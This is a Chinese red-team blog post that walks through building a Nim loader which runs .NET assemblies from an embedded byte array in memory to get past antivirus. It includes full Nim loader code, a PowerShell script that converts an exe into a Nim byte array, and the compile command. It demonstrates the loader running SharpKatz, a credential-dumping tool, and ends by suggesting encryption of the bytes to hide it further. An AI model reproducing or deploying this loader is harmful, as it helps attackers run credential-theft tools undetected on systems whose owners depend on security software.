#  Nim套娃加载.NET程序集

原创 RedTeamWing [ RedTeaming ](javascript:void\(0\);)

**RedTeaming** ![]()

微信号 RedTeamer

功能介绍 Know it,Then hacking it!

____

__

收录于话题

  

## 简介

使用OffensiveNim绕过常见杀软。

## Start the game

主要用到的库是WINIM

    
    
    import winim/clr  
    import sugar  
    import strformat  
      
    # Just pops a message box... or does it? ;)  
    var buf: array[4608, byte] = [byte 0x4d,0x5a,0x90,0x0]  
      
    echo "[*] Installed .NET versions"  
    for v in clrVersions():  
        echo fmt"    \--- {v}"  
    echo "\n"  
      
    echo ""  
      
    var assembly = load(buf)  
    dump assembly  
      
      
    var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments  
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))  
      
    arr = toCLRVariant(["From Nim & .NET!"], VT_BSTR) # Actually passing some args  
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))  
    

作者提供了一个ps脚本将exe转为符合nim的bytes数组。

    
    
    function CSharpToNimByteArray  
    {  
      
    Param  
        (  
            [string]  
            $inputfile,  
    	    [switch]  
            $folder  
    )  
      
        if ($folder)  
        {  
            $Files = Get-Childitem -Path $inputfile -File  
            $fullname = $Files.FullName  
            foreach($file in $fullname)  
            {  
                Write-Host "Converting $file"  
                $outfile = $File + "NimByteArray.txt"  
          
                [byte[]] $hex = get-content -encoding byte -path $File  
                $hexString = ($hex|ForEach-Object ToString X2) -join ',0x'  
                $Results = $hexString.Insert(0,"var buf: array[" + $hex.Length + ", byte] = [byte 0x")  
                $Results = $Results + "]"           
                $Results | out-file $outfile  
               
            }  
            Write-Host -ForegroundColor yellow "Results Written to the same folder"  
        }  
        else  
        {  
            Write-Host "Converting $inputfile"  
            $outfile = $inputfile + "NimByteArray.txt"  
              
            [byte[]] $hex = get-content -encoding byte -path $inputfile  
            $hexString = ($hex|ForEach-Object ToString X2) -join ',0x'  
            $Results = $hexString.Insert(0,"var buf: array[" + $hex.Length + ", byte] = [byte 0x")  
            $Results = $Results + "]"           
            $Results | out-file $outfile  
            Write-Host "Result Written to $outfile"  
        }  
    }

测试SharpKatz

![](https://gitee.com/fuli009/images/raw/master/public/20210830111919.png)

体积有点大。

编译

    
    
    nim c -d=mingw --app=console --cpu=amd64 execute_assembly.nim

Bingo

![](https://gitee.com/fuli009/images/raw/master/public/20210830111920.png)

体积只有800k。

![](https://gitee.com/fuli009/images/raw/master/public/20210830111921.png)

现在还没法执行自定义参数，源码修改后如下:

    
    
    import winim/clr  
    import sugar  
    import strformat  
    import os  
      
    # Just pops a message box... or does it? ;)  
    var buf: array[4608, byte] = [byte 0x4d,0x5a,0x90,0x0]  
      
    echo "[*] Installed .NET versions"  
    for v in clrVersions():  
        echo fmt"    \--- {v}"  
    echo "\n"  
      
    echo ""  
      
    var assembly = load(buf)  
    dump assembly  
      
      
    var cmd: seq[string]  
    var i = 1  
    while i <= paramCount():  
        cmd.add(paramStr(i))  
        inc(i)  
    echo cmd  
    var arr = toCLRVariant(cmd, VT_BSTR)  
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

![](https://gitee.com/fuli009/images/raw/master/public/20210830111922.png)

  

OJBK.

要更进一步隐藏的话，需要对字节进行加密解密。

nim感觉搞懂winim这个库就能写好多小工具了。

戳我直达原文地址

  

![](https://gitee.com/fuli009/images/raw/master/public/20210830111923.png)

插播一条广告，使用语雀开了一个红队知识库的空间，免费共享。

详情地址 https://www.yuque.com/u212486/hqo6tb/rmzr1u

  

![]()

RedTeamWing

Wing

![赞赏二维码]() **微信扫一扫赞赏作者** 赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

Wing

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

Nim套娃加载.NET程序集

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

